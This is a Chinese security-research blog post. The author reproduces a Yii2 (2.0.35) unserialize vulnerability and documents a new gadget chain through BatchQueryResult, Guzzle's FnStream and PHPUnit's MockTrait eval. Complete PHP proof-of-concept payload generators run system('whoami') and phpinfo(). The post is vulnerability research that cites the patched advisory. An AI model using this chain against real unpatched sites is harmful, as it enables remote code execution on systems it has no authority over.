前言
--

我是刚入门不久的小白, 如果有什么地方不对，请师父们及时指正. 本文参考奶权师傅的 Yii复现文章: [https://mp.weixin.qq.com/s/NHBpF446yKQbRTiNQr8ztA](https://mp.weixin.qq.com/s/NHBpF446yKQbRTiNQr8ztA%5D) 受益匪浅，自己调试的时候发现了一个新的利用链，于是来分享下

开始
--

反序列化漏洞影响到 2.0.38 被修复 <https://github.com/yiisoft/yii2/security/advisories/GHSA-699q-wcff-g9mj>  
![001](https://shs3.b.qianxin.com/butian_public/f5afe65f2d9cb6e31ea1d80a53d6bb967.jpg)

Hello World
-----------

由于挖洞的时候遇到一个 cms 是 Yii2.0.35 的所以我选择复现Yii2.0.35: <https://github.com/yiisoft/yii2/releases/tag/2.0.35>, 跟着文档把 Hello World 写出来. 大概了解一下开发流程.

环境我用：phpstudy 集成环境. apache2.4.39 + php 7.4.3 + phpstorm 开启 xdebug;

如下，我创建了一个action：<http://127.0.0.1/yii2.0.35/web/index.php?r=test/index>, controllers的命名是 名称Controller，action的命名是: action名称

![002](https://shs3.b.qianxin.com/butian_public/f429e65b208d7d0808049afa34f5fd937.jpg)

/views/test/index.php. 其中test是控制器(controller)的名称。 index 是 render 中的view 参数命名的

![003](https://shs3.b.qianxin.com/butian_public/f392cad067610fe04cf064ba65671bc3b.jpg)

页面效果,

![004](https://shs3.b.qianxin.com/butian_public/f76451200dec3e40a8dc7e0217da93757.jpg)

小技巧
---

在开始追踪利用连前, 提供一些小技巧, 另外我喜欢用 Vscode 来匹配内容(因为 Vscode 点击相应的搜索结果可以快速的定位到, 方便查看), 用 phpstorm 跟踪函数

**正则匹配可控的方法**

```shell
->\$([a-zA-Z0-9_-]+)\(
```

![010](https://shs3.b.qianxin.com/butian_public/f349d3eeb1b42979466e8a87bd669e89f.jpg)

**正则匹配可控的传入参数**

```shell
[^if ][^foreach ][^while ]\(\$([a-zA-Z0-9_-]+)->
```

![011](https://shs3.b.qianxin.com/butian_public/f4b3c1710f5b88161ba6957185b9c6263.jpg)

反序列化利用链
-------

全局搜索 \_\_destruct (**反序列化后, 销毁对象时会触发的函数**), 定位到 &lt;u&gt;vendor/yiisoft/yii2/db/BatchQueryResult.php&lt;/u&gt;, 给 this-&gt;reset();

```php
public function __destruct()
{
    // make sure cursor is closed
    $this->reset();
}
```

跟踪 restet 方法, 反序列化时, 反序列化的对象成员属性也是可控的. 所以 $this-&gt;\_dataReader 可控， 可以进入 close 方法.

```php
public function reset()
{
    if ($this->_dataReader !== null) {
        $this->_dataReader->close();
    }
    $this->_dataReader = null;
    $this->_batch = null;
    $this->_value = null;
    $this->_key = null;
}
```

那么这里就形成了一个跳板. 全局找 close() 方法. 最后在 &lt;u&gt;/vendor/guzzlehttp/psr7/src/FnStream.php&lt;/u&gt; 中找到一个非常危险的 close 方法, 该方法接收一个参数, 是可控的成员属性.

```php
public function close()
{
    return call_user_func($this->_fn_close);
}
```

POC 编写.
-------

先提供一个反序列化的点. 修改 TestController 不要 render. 直接 var\_dump unserialize;

```php
class TestController extends Controller {
    public function actionIndex($message="Hello") {
        var_dump(unserialize($message));
//        return $this->render("index", ['message'=>$message]);
    }
}
```

对于 poc 的编写, 需要注意命名空间. 否则无法定位到相应的类. 也因为他会自动定位到相应的类，所以不用像原本定义一样继承相应的父类.

&lt;u&gt;vendor/yiisoft/yii2/db/BatchQueryResult.php&lt;/u&gt;

```php
namespace yii\db;

class BatchQueryResult {
    // 需要控制的成员属性
    private $_dataReader;
}
```

&lt;u&gt;vendor/guzzlehttp/psr7/src/FnStream.php&lt;/u&gt;

```php
namespace GuzzleHttp\Psr7;

class FnStream implements StreamInterface {
    // 需要控制的参数, 原本并没有定义所以无要求
    var $_fn_close;
}
```

poc 如下

```php
<?php

namespace GuzzleHttp\Psr7 {
    class FnStream {
        var $_fn_close = "phpinfo";
    }
}

namespace yii\db {
    use GuzzleHttp\Psr7\FnStream;
    class BatchQueryResult {
        // 需要控制的成员属性
        private $_dataReader;

        public function __construct() {
            $this->_dataReader  = new FnStream();
        }
    }

    $b = new BatchQueryResult();
    var_dump(serialize($b));
}
```

执行成功.  
![005](https://shs3.b.qianxin.com/butian_public/fe4dc983f235404b78b91449e9c1d5270.jpg)

危害放大
----

可以注意到, FnStream 类中的 call\_user\_func 只有一个参数. 翻一翻官方文档，发现了相应的解决方法. 所以遇到阻塞时，多翻翻手册也许会柳暗花明

![006](https://shs3.b.qianxin.com/butian_public/f661ffef09b4af02fa16c3bc07525a3fb.jpg)

如果要放大危害，这里只能作为跳板，还需要一个类. 全局搜索各危险函数. 寻找参数可控的方法.

在 &lt;u&gt;vendor\\phpunit\\phpunit\\src\\Framework\\MockObject\\MockTrait.php&lt;/u&gt; 中找到了相应的方法

```php
public function generate(): string
{
    if (!\class_exists($this->mockName, false)) {
        eval($this->classCode);
    }
    return $this->mockName;
}
```

修改 poc

```php
<?php

namespace PHPUnit\Framework\MockObject{
    class MockTrait {
        private $classCode = "system('whoami');";
        private $mockName = "anything";
    }
}

namespace GuzzleHttp\Psr7 {
    use PHPUnit\Framework\MockObject\MockTrait;
    class FnStream {
        var $_fn_close;

        function __construct() {
            $this->_fn_close = array(
                new MockTrait(),
                'generate'
            );
        }
    }
}

namespace yii\db {
    use GuzzleHttp\Psr7\FnStream;
    class BatchQueryResult {
        // 需要控制的成员属性
        private $_dataReader;

        function __construct() {
            $this->_dataReader  = new FnStream();
        }
    }

    $b = new BatchQueryResult();
    file_put_contents("poc.txt", serialize($b));
}
```

再次尝试, 报错了！！！这是修复了吗??，低版本也？  
![007](https://shs3.b.qianxin.com/butian_public/f3875fb1f0d9e43d619bae322ab8fa10e.jpg)

但是 phpinfo() 可以正常执行. 当我再回去看的时候. 我发现我**漏掉了最底下的报错信息**！！！。

先将 poc 复原到 phpinfo(); 可以看到虽然 throw 了, 但 phpinfo 正常执行. 不清楚是什么原因。我的猜想是: phpinfo 回显内容过大触发了分段传输. 我会继续研究这个问题.

![008](https://shs3.b.qianxin.com/butian_public/f9a9670fe2ac2a702fc964f0c90c8c740.jpg)

利用这个方法. 修改一下 poc，加上phpifnfo();

最终 poc
------

```php
<?php

namespace PHPUnit\Framework\MockObject{
    class MockTrait {
        private $classCode = "system('whoami');phpinfo();";
        private $mockName = "anything";
    }
}

namespace GuzzleHttp\Psr7 {
    use PHPUnit\Framework\MockObject\MockTrait;
    class FnStream {
        var $_fn_close;

        function __construct() {
            $this->_fn_close = array(
                new MockTrait(),
                'generate'
            );
        }
    }
}

namespace yii\db {
    use GuzzleHttp\Psr7\FnStream;
    class BatchQueryResult {
        // 需要控制的成员属性
        private $_dataReader;

        function __construct() {
            $this->_dataReader  = new FnStream();
        }
    }

    $b = new BatchQueryResult();
    file_put_contents("poc.txt", serialize($b));
}
```

整理一下反序列化链

![009](https://shs3.b.qianxin.com/butian_public/f7c2f1ebbbfb6b056aba1f8d2c6b16f47.jpg)